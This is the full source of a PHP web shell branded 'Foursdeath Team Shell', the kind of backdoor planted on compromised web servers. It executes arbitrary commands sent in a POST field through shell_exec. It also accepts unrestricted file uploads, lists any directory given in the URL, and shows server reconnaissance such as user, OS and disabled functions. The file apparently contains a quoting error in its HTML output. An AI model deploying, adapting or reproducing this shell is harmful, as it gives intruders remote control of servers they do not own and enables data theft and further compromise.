<?php
error_reporting(0);
session_start();

function perms($file) {
  $perms = fileperms($file);
  $info = '';
  if (($perms & 0xC000) == 0xC000) {
    $info = 's';
  } elseif (($perms & 0xA000) == 0xA000) {
    $info = 'l';
  } elseif (($perms & 0x8000) == 0x8000) {
    $info = '-';
  } elseif (($perms & 0x6000) == 0x6000) {
    $info = 'b';
  } elseif (($perms & 0x4000) == 0x4000) {
    $info = 'd';
  } elseif (($perms & 0x2000) == 0x2000) {
    $info = 'c';
  } elseif (($perms & 0x1000) == 0x1000) {
    $info = 'p';
  } else {
    $info = 'u';
  }
  $info .= (($perms & 0x0100) ? 'r' : '-') .
           (($perms & 0x0080) ? 'w' : '-') .
           (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x') :
            (($perms & 0x0800) ? 'S' : '-')) .
           (($perms & 0x0020) ? 'r' : '-') .
           (($perms & 0x0010) ? 'w' : '-') .
           (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x') :
            (($perms & 0x0400) ? 'S' : '-')) .
           (($perms & 0x0004) ? 'r' : '-') .
           (($perms & 0x0002) ? 'w' : '-') .
           (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x') :
            (($perms & 0x0200) ? 'T' : '-'));
  return $info;
}

if (isset($_FILES['upload'])) {
  move_uploaded_file($_FILES['upload']['tmp_name'], $_FILES['upload']['name'])
    ? $msg = "Upload success: " . $_FILES['upload']['name']
    : $msg = "Upload failed!";
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($path);
$files = scandir($path);
$ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
$safe_mode = ini_get('safe_mode');
$disable_functions = ini_get('disable_functions');
$user = get_current_user();
$os = PHP_OS;
$phpver = phpversion();
$date = date('Y-m-d H:i:s');

if (isset($_POST['cmd'])) {
  $output = shell_exec($_POST['cmd']);
}

echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Foursdeath Shell - Powered by X\'Boy Linux</title>
<style>
body {
  margin: 0;
  font-family: monospace;
  background: url(https://g.top4top.io/p_1825r6iwh0.jpg) no-repeat center center fixed;
  background-size: cover;
  color: #33f702;
}
header { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: rgba(0,0,0,0.8); }
header img { height: 50px; }
.title { font-size: 1.2em; }
.tool-buttons { display: flex; flex-wrap: wrap; gap: 10px; padding: 10px; justify-content: center; }
.tool-buttons form, .tool-buttons button { margin: 0; }
button { background: #000; border: 1px solid #33f702; padding: 8px; color: #33f702; border-radius: 6px; cursor: pointer; }
button:hover { background: #33f702; color: #000; }
.file-manager { padding: 20px; background: rgba(0,0,0,0.8); margin: 10px; border-radius: 10px; }
table { width: 100%; border-collapse: collapse; }
th, td { padding: 8px; border: 1px solid #33f702; text-align: center; }
textarea { width: 100%; height: 100px; }
</style>
</head>
<body>
<header>
  <div class="title">Foursdeath Team Shell<br><small>powered by X\'Boy Linux</small></div>
  <img src="https://i.top4top.io/p_22457217t0.png">
</header>

<div class="tool-buttons">
  <form method="POST" enctype="multipart/form-data">
    <input type="file" name="upload">
    <button>Upload</button>
  </form>
  <form method="POST">
    <input type="text" name="cmd" placeholder="Command...">
    <button>Execute</button>
  </form>
</div>

<div class="file-manager">
<h3>Server Info</h3>
<ul>
  <li><b>IP:</b> $ip</li>
  <li><b>OS:</b> $os</li>
  <li><b>User:</b> $user</li>
  <li><b>Safe Mode:</b> $safe_mode</li>
  <li><b>Disabled Functions:</b> $disable_functions</li>
  <li><b>PHP Version:</b> $phpver</li>
  <li><b>Datetime:</b> $date</li>
</ul>
<h3>Path: $path</h3>
<table>
<thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th></tr></thead><tbody>";

foreach ($files as $file) {
  $full = $path . DIRECTORY_SEPARATOR . $file;
  $size = is_file($full) ? filesize($full) : '-';
  $perm = perms($full);
  $mod = date("Y-m-d H:i:s", filemtime($full));
  echo "<tr><td>$file</td><td>$size</td><td>$perm</td><td>$mod</td></tr>";
}

echo "</tbody></table></div>";
if (!empty($msg)) echo "<div style='padding:10px;color:#0f0;'>$msg</div>";
if (!empty($output)) echo "<pre style='padding:10px;background:#000;'>$output</pre>";
echo "<audio src='https://b.top4top.io/m_17923krtx0.mp3' autoplay loop hidden></audio>";
echo '</body></html>';
?>
